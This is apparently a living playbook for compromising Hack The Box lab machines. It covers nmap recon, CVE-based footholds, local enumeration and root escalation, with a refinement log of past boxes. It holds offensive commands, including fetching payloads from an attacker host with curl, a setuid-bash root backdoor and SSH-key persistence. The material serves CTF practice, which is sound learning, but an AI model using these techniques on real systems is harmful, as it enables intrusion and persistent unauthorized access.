# Machines Methodology — Pwning Boxes (living doc)

A refined, experience-driven playbook for taking a standalone box from `nmap` to `root`. This is **not** a static checklist — after every box, append a note to the **Refinement Log** at the bottom with what worked, what wasted time, and the habit to keep. Builds on `../methodology/core-principles.md` (enumerate first, never test blindly, simple before complex).

> Rule of thumb: **User = find the one exposed app + its known bug. Root = find the one thing running/owned as root that you can influence.** Most of the work is *enumeration to identify that one thing*, not exploitation.

---

## Phase 0 — Framing (before touching the box)
- Note **difficulty + OS** from the platform page. Difficulty sets strategy:
  - **Easy** → the path is short and usually a *known* CVE or a *simple* misconfig (writable cron/incron/sudoers, cleartext creds, default password). If you're deep-reversing a custom service on an easy box, you probably missed the intended path — see [[check-known-path-early]] habit below.
  - **Medium/Hard** → expect chaining, custom code, pivoting, and real red herrings.
- HTB targets are on the private VPN — the operator runs commands; document after each output, track stage + next step.

---

## Phase 1 — Recon (map the surface)
1. **Full TCP port scan**, then targeted service/version + scripts:
   - `nmap -p- --min-rate 5000 -T4 -oN allports <IP>`
   - `nmap -sC -sV -p<ports> -oN services <IP>`
2. **Pin exact versions.** Version strings drive everything (OS, web server, PHP, app framework). Write them down verbatim.
3. **Web:** follow redirects, add the `/etc/hosts` entry for any hostname, then **fingerprint product + version** (title, headers, `X-Powered-By`, asset query strings like `?load_version=`, generator meta, login-page footers, favicon hash). `whatweb`, `curl -i -L`.
4. **vhosts / subdomains** if a hostname appears (`ffuf -H "Host: FUZZ.box.htb"`).
5. **TLS certs** leak product/hostnames (CN/SAN) — e.g. `pbxconnect` gave away FreePBX on Connected.

**Deliverable of Phase 1:** "Port X runs **<product> <exact version>**." That sentence is what you attack.

---

## Phase 2 — Foothold → User
1. **Product + version → known vuln first.** Search `"<product> <version> CVE / exploit / PoC"`. On rated boxes it is almost always a public CVE with a PoC. Don't hand-roll an exploit before checking. (Reactor=CVE-2025-55182, Enigma=OliveTin/OpenSTAManager CVEs, Connected=FreePBX CVE-2025-57819.)
2. **Prefer a ready PoC / Metasploit module**, but read what it does before running it. Set LHOST to the VPN (`tun0`) IP explicitly.
3. If no CVE: default-creds → weak login (targeted brute) → injection/upload/LFI/SSRF per the relevant `../methodology/` doc and `../checklists/`.
4. **Get the user flag**, then immediately **stabilize** (see playbook `../playbooks/reverse-shell-and-shell-stabilization.md`): PTY upgrade, and drop an SSH key for a clean shell. Transfer files via a short `curl http://<kali>:8000/x` — **never paste long strings into a raw reverse shell** (the PTY wraps/corrupts them; burned time on Connected).

---

## Phase 3 — Local Enumeration (the part that finds root)
Run the cheap, high-signal checks **first and in this order** — the answer is usually here before you need LinPEAS:
1. `id` / `sudo -l` (needs a TTY; try harvested passwords).
2. **Creds on disk** → reuse everywhere: app config files (DB creds, admin hashes), history files, backups. `../playbooks/credential-hunting-and-reuse.md`.
3. **SUID / capabilities:** `find / -perm -4000 -type f 2>/dev/null`, `getcap -r / 2>/dev/null`.
4. **Scheduled/triggered execution:** cron (`/etc/cron*`, `/etc/crontab`), **incron / file-watchers**, systemd timers — especially any that run a **script or watched path you can write**. `../playbooks/cron-incron-file-watchers.md`.
5. **What runs as root:** `ps -eo user,pid,cmd | sort` — look for root processes with a **debug port**, a **writable script**, or a **local-only network service**.
6. **Localhost-only services:** `ss -tlnp` / `netstat -tulpn` — Mongo/Redis/AMI/node/python bound to `127.0.0.1` are reachable only now that you're local; a root-owned one is a prime target (but confirm it has a local sink — see decoys). `../playbooks/localhost-internal-services.md`.
7. **Group membership**, writable service files, PATH abuse, kernel/distro version → known local exploits.
8. Only then run **LinPEAS** to catch anything missed.

---

## Phase 4 — Privesc → Root
- Match the finding to a playbook in `../playbooks/`. Build the exploit from observed context, one step at a time.
- Preferred low-noise root primitive when you get one code-exec-as-root shot: `chmod +s /bin/bash` → `/bin/bash -p` (no listener needed). Or write an SSH key to `/root/.ssh/`, or a root cron.
- Grab `root.txt`, then write the box up.

---

## Good Habits (earned the hard way)
- **Pin exact versions**; a lead that requires a component/version that isn't actually present or fetchable is **bait** (Reactor: lxd group with no LXD installed & no snap connectivity; CVE-2025-29927 with no middleware).
- <a id="check-known-path-early"></a>**Check the known path early on easy boxes.** If a shiny custom service runs as root, *grep it for a local sink* (`subprocess|os.system|eval|open(...,'w')|exec`) before reading it line by line. **No local sink ⇒ probably a decoy** (Connected: `aiovega` proxied only to a remote device; Mongo/Redis were decoys too). Web-searching the box name + service/version to sanity-check the intended route is fair game.
- **Enumerate in cost order:** `sudo -l`/creds/SUID/cron are seconds of work and solve most boxes; don't open a 20 KB source file until the cheap checks are exhausted.
- **Loot once, reuse everywhere:** every password/hash found gets tried against SSH, `su`, other users, DB, web logins.
- **Stabilize before you enumerate deeply** — a clean SSH shell beats fighting a mangling PTY.
- **Document live**, one finding per output, always noting *stage* and *next step*.
- **Commit + push** the writeup and any reusable exploit script immediately after rooting.

---

## Quick Reference — one-box flow
```
nmap -p-  ->  nmap -sCsV  ->  pin versions  ->  fingerprint web app + version
   -> known CVE/PoC -> foothold -> user.txt -> PTY + SSH key
   -> sudo -l / creds / SUID / cron+incron / root procs / localhost svcs
   -> match playbook -> root primitive (chmod +s bash) -> root.txt -> writeup + push
```

---

## Refinement Log (append one entry per box)
- **Nexus (rooted):** template/path traversal to root; exploit scripted (`scripts/nexus_root_template_traversal.sh`). Habit: script the repeatable primitive.
- **Enigma (rooted):** foothold OpenSTAManager `.p7m` cmd-injection CVE; root via localhost **OliveTin** (root:1337) password-arg cmd injection. Habit: after shell, always `ss -tlnp` for localhost-only admin panels.
- **Reactor (rooted):** Next.js React2Shell CVE foothold; root via **root Node `--inspect` debug port** (unauth code exec as owner). Two red herrings needed absent components. Habit: scan `ps` for root services with debug ports; pin versions; a lead needing an absent component is bait.
- **Connected (rooted):** FreePBX 16.0.40.7 **CVE-2025-57819** endpoint SQLi→cron revshell as `asterisk`; root via FreePBX **sysadmin incron hook** (world-writable watched dir + `sysadmin_manager` param filter missing `|` + `CONTENTS` magic param → `chmod +s bash`). Wasted turns reversing the `aiovega` **decoy**. Habits added: check known path early on easy boxes; verify a custom root service has a local sink before reversing; don't paste long strings into a raw PTY.
```
